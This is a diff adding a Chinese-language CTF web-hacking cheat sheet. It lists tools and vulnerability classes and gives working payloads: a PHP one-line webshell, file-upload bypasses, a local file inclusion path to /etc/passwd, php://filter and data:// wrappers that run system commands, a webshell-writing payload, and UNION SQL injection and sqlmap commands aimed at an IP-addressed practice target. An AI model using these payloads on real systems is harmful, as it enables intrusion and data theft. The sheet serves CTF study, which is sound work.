@@ -1,0 +1,183 @@
+CTF WEB
+
+Java python PHP xml sql node.js javascript html 汇编 c c++ golang
+
+工具：
+1、kali linux
+2、burp suite
+(快捷键：ctrl + U 快速URL编码   ctrl+shift+U：URL解码。    ctrl + B 快速base64编码   ctrl+shift+B：base64解码)
+
+
+3、webshell管理工具（蚁剑（exe）、哥斯拉（jar）、冰蝎(jar)）
+4、浏览器（用chrome谷歌、火狐firefox）
+	火狐的插件：FoxyProxy-小狐狸-做浏览器代理抓包用
+	Hackbar
+
+
+1、信息泄漏类
+	如何去做信息收集？
+	（1）源代码泄漏： 1、在网页上（F12，在网页源代码内）
+						2、通过目录扫描 or 文件扫描发现存在敏感文件（*.zip *.rar *.tar *.tar.gz  www.*  wwwroot.*）
+						3、.git泄漏、.svn泄漏、.hg泄漏
+	（2）备份文件泄漏：
+						1、常见的备份文件的格式及类型（*.php.bak、*.php~（gedit）、*.php.swp *.php.swo（vim））
+	（3）特殊类型文件：readme.md、robots.txt
+
+2、注入类型
+	（1）SQL注入：
+		认识mysql的结构及语法（会SQL语言）
+		了解SQL注入的各种类型的利用及其绕过
+			1、联合查询注入 union select
+			2、GET、POST、cookie、http头部注入
+			3、报错注入 常见的报错注入函数的使用
+			4、盲注（时间盲注和布尔盲注）
+			5、二次注入
+			6、堆叠注入
+		手工注入、SQLMap
+		通过SQL注入漏洞去读写文件、反弹shell、写后门。
+	（2）命令注入
+		代码执行漏洞、命令执行漏洞
+		
+		一定会有过滤！！！
+
+	（3）对象注入
+		php的反序列化、Java反序列化
+		php语言及PHP面向对象
+		一定会写exp、一般都是.php
+		魔法函数（魔术方法）的触发条件！！！！！！！！！！！
+		如何判断一个题或者一段源代码存在反序列化：
+			1、一定会存在反序列化函数 - unserilaze()，且反序列化函数的参数可控。
+			2、存在魔术方法
+			3、魔术方法内存在恶意函数（可以执行命令 or 代码的函数 eval system）
+			4、恶意函数的参数是动态的，可控.  eval($_GET[cmd])
+
+	（4）SSTI（模版注入）
+		python
+		了解python web框架：flask、Django
+
+3、文件类
+		1、文件上传漏洞（上传的文件一定是一个木马、后门、webshell）
+
+			一句话木马：<?php eval($_POST['cmd']);?>
+
+			1、禁用浏览器的JS解析功能
+			2、文件后缀的复写：.php -> .    .pphphp      .phphpp
+			3、重新定义解析规则： .htaccess(apache)     .user.ini(nginx)
+			4、MIME绕过，改变文件的content-type：image/jpg    image/png
+			5、文件头绕过：一般用GIF89a
+			6、截断绕过：index.php.jpg   00%  0x00   chr()   index.php%00.jpg
+			7、中间件的解析漏洞：apache：从后向前解析，遇到不认识的跳过，直到遇到认识的为止，如果都不认识，直接展示源代码。 index.php.a.b.d.r.f        nginx：  index.php;.jpg
+			8、条件竞争
+
+		2、文件包含漏洞
+			形式：index.php?file=show.php
+			进一步验证该漏洞是否为任意文件包含漏洞：index.php?file=../../../../../../etc/passwd
+			1、伪协议
+				php://      php://filter -- 读取文件的源码
+								php://filter/read=convert.base64-encode/resource=flag.php
+
+								php://input -- 用来接受POST数据，POST数据一般都是php代码
+				data://
+					data://text/plain;base64,[base64编码的脚本]
+
+					data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmw0Z2lzaXNpc2gzcjMucGhwJyk7
+				phar://
+					.phar
+			2、文件包含写入木马
+				
+				<?php fputs(fopen('../shell.php','w'),'<?php eval($_POST[cmd]);?>');?>
+
+4、服务类
+	1、XSS - 跨站脚本攻击（反射型、存储型、DOM型）
+	* 2、XXE - XML外部实体注入（XML语言）
+	3、CSRF - 跨站请求伪造
+	* 4、SSRF - 服务端请求伪造
+
+5、认证绕过类：
+	（1）json web token (JWT) : https://jwt.io/
+	（2）cookie伪造
+	（3）IP伪造：X-Forwarded-For:127.0.0.1
+
+6、CVE、CMS
+	近期常见的CVE漏洞、常见CMS及其漏洞
+	CMS：织梦、phpok、Wordpress、typecho
+
+7、0day nday
+
+dirsearch -u [url] -e*
+
+
+id=1' 报错，表示存在SQL注入
+
+id=1 and 1=1 不报错
+id=1 and 1=2 不报错
+id=1' and 1=1 %23 不报错
+id=1' and 1=2 %23 报错
+
+--> 存在GET 型单引号字符类型的注入
+
+id=1' order by 10 %23 报错
+id=1' order by 5 %23 报错
+id=1' order by 3 %23 不报错
+id=1' order by 4 %23 报错
+
+--> 说明存在3列
+
+求显示位：
+id=-1' union select 1,2,3 %23
+
+查询所有数据库名：
+
+id=1' and 1=2 union select 1,2,group_concat(schema_name) from information_schema.schemata %23
+
+查询当前数据库名：
+
+id=1' and 1=2 union select 1,2,concat(database())%23
+
+查询数据库下数据表：
+
+1' and 1=2 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='note'%23
+
+查询表下字段
+
+1' and 1=2 union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='note' and table _name='fl4g'%23
+
+查询字段的内容：
+
+1' and 1=2 union select 1,2,group_concat(fllllag) from note.fl4g%23
+
+
+Sqlmap:
+
+sqlmap -u http://106.39.10.134:36389/index.php?id=1
+
+sqlmap -u http://106.39.10.134:36389/index.php?id=1 --dbs 查看所有数据库
+
+查看当前数据库：sqlmap -u http://106.39.10.134:36389/index.php?id=1 --current-db
+
+查表：sqlmap -u http://106.39.10.134:36389/index.php?id=1 -D note --tables
+
+查字段：sqlmap -u http://106.39.10.134:36389/index.php?id=1 -D note -T fl4g --columns
+
+查数据：sqlmap -u http://106.39.10.134:36389/index.php?id=1 -D note -T fl4g -C fllllag --dump
+
+
+SQlmap POST
+
+id=1
+
+sqlmap -u http://106.39.10.134:36389/index.php --data=id=1 --dbs
+
+
+SQLmap 跑POST文件:
+在Burp中抓包，右击保存为文件（copy to file）
+sqlmap -r 1.txt --dbs
+
+
+
+
+
+
+
+
+
